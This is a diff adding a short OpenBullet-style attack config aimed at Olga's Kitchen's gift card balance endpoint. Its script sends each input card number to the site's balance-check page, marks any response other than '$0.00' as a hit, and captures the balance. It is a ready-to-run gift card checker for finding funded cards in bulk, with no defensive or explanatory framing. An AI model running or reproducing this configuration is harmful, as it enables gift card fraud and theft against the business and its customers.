@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "olgaskitchen.com",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-13T19:07:11.2726611+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.olgas.com/getGiftCardBalance.php" AutoRedirect=TRUE 
+  CONTENT "cardNumber=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "$0.00" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "$0.00" 
+PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> CAP "Balance" "" "" 
